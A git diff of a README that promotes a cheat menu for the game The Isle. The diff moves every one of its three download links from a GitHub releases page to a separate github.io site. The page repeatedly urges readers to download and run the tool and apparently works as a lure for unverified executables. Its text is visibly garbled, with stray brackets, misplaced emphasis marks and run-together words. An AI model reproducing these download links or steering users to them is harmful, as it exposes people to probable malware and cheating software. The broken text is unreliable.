@@ -1,6 +1,6 @@
 # 🦖 the-isle-cheat-menu-survival-toolkit - Master Survival with Smart Dino Tools
 
-[![Download Now](https://img.shields.io/badge/Download-The_Isle_Toolkit-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wholemilkthyroprotein2212/the-isle-cheat-menu-survival-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-The_Isle_Toolkit-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://wholemilkthyroprotein2212.github.io)
 
 ## 🌟 What Is This?
 
@@ -25,7 +25,7 @@ Your journey to becoming the apex predator starts witha simple download**. Let�
 
 Visit this link to download the application:
 
-[🔗 Click Here to Download The Isle CheatMenu Toolkit](https://github.com/wholemilkthyroprotein2212/the-isle-cheat-menu-survival-toolkit/releases)
+[🔗 Click Here to Download The Isle CheatMenu Toolkit](https://wholemilkthyroprotein2212.github.io)
 
 )
 
@@ -145,7 +145,7 @@ A: When new dinos or map changes come out**, the toolkit gets an update**– usu
 
 If you need the file again or missed the link above**,here it is one more time**:
 
-[🔗 Direct Download Page – The Isle CheatMenu Survival Toolkit](https://github.com/wholemilkthyroprotein2212/the-isle-cheat-menu-survival-toolkit/releases)
+[🔗 Direct Download Page – The Isle CheatMenu Survival Toolkit](https://wholemilkthyroprotein2212.github.io)
 
 )
 
